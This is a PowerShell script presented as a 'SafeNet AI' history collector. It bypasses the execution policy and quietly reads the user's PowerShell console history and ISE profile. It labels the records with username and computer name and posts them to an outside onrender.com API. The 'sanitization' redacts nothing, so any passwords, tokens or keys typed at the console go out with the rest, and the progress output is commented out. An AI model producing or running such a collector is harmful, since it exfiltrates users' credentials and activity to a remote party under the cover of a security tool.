# ==================================================================
# SafeNet AI - PowerShell Command History Collector + API Sender
# Collects sanitized PowerShell command history and sends JSON to API
# ==================================================================

# --- Step 1: Set execution policy temporarily ---
try {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction Stop
    #Write-Host '[+] Execution policy set to Bypass for this session.' -ForegroundColor Green
} catch {
    Write-Warning '[-] Unable to set execution policy. Try running as Administrator.'
}

# --- Step 2: Determine script directory ---
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
if (-not $scriptDir) { $scriptDir = Get-Location }

# --- Step 3: Create results folder ---
$resultsDir = Join-Path $scriptDir 'results'
if (-not (Test-Path $resultsDir)) {
    New-Item -ItemType Directory -Path $resultsDir | Out-Null
    #Write-Host "[+] Created results folder: $resultsDir" -ForegroundColor Green
}

# --- Step 4: User info ---
$UserName     = $env:USERNAME
$ComputerName = $env:COMPUTERNAME

# --- Step 5: Define PowerShell history paths ---
$PSConsoleHistory = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
$ISEHistory       = Join-Path $env:USERPROFILE 'Documents\WindowsPowerShell\Microsoft.PowerShellISE_profile.ps1'

# --- Step 6: Prepare result holder ---
$HistoryRecords = @()

# --- Step 7: Sanitization function ---
function Clean-Command {
    param ($line)
    if ($null -eq $line) { return $null }
    $trimmed = $line.Trim()
    if ([string]::IsNullOrWhiteSpace($trimmed)) { return $null }
    if ($trimmed -match '^[#\s]*$') { return $null }
    return $trimmed
}

# --- Step 8: Read Console History ---
if (Test-Path $PSConsoleHistory) {
    #Write-Host '[+] Reading PowerShell Console history...' -ForegroundColor Cyan
    $ConsoleLines = Get-Content $PSConsoleHistory -ErrorAction SilentlyContinue | ForEach-Object { Clean-Command $_ }
    $ConsoleLines = $ConsoleLines | Where-Object { $_ -ne $null }

    foreach ($cmd in $ConsoleLines) {
        $HistoryRecords += [PSCustomObject]@{
            Source    = 'PowerShell Console'
            Command   = $cmd
            Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
            UserName  = $UserName
            Computer  = $ComputerName
        }
    }
} else {
    Write-Warning "ConsoleHost_history.txt not found at $PSConsoleHistory"
}

# --- Step 9: Read ISE History (optional) ---
if (Test-Path $ISEHistory) {
    #Write-Host '[+] Reading PowerShell ISE profile commands...' -ForegroundColor Cyan
    $ISELines = Get-Content $ISEHistory -ErrorAction SilentlyContinue | ForEach-Object { Clean-Command $_ }
    $ISELines = $ISELines | Where-Object { $_ -ne $null }

    foreach ($cmd in $ISELines) {
        $HistoryRecords += [PSCustomObject]@{
            Source    = 'PowerShell ISE'
            Command   = $cmd
            Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
            UserName  = $UserName
            Computer  = $ComputerName
        }
    }
} else {
    # ISE profile optional, do nothing if missing
}

# --- Step 10: Export JSON locally and send to endpoint ---
if ($HistoryRecords.Count -gt 0) {
    $JsonOutput = $HistoryRecords | ConvertTo-Json -Depth 6
    $OutputFile = Join-Path $resultsDir ('powershell_history_' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.json')
    $JsonOutput | Out-File -FilePath $OutputFile -Encoding UTF8
    #Write-Host "[+] PowerShell command history saved locally to: $OutputFile" -ForegroundColor Green

    # --- Step 11: Send JSON to API endpoint ---
    $endpoint = 'https://backlify-v2.onrender.com/api/analysis'
    try {
        #Write-Host '[>] Sending data to API endpoint...' -ForegroundColor Yellow
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $JsonOutput -ContentType 'application/json' -ErrorAction Stop
        #Write-Host '[✓] Successfully sent data to API endpoint!' -ForegroundColor Green
        if ($null -ne $response) {
            $RespFile = Join-Path $resultsDir ('response_' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
            ($response | Out-String) | Out-File -FilePath $RespFile -Encoding UTF8
            #Write-Host "[+] Response saved to: $RespFile" -ForegroundColor Gray
        }
    } catch {
        $errText = $_.Exception.Message
        $ErrFile = Join-Path $resultsDir ('error_' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
        $errText | Out-File -FilePath $ErrFile -Encoding UTF8
        Write-Warning "Failed to send data to API. Error saved to: $ErrFile"
    }
} else {
    Write-Warning 'No PowerShell command history found to export or send.'
}

# --- Step 12: End message ---
#Write-Host "`n[+] Script completed successfully at $(Get-Date)" -ForegroundColor Green
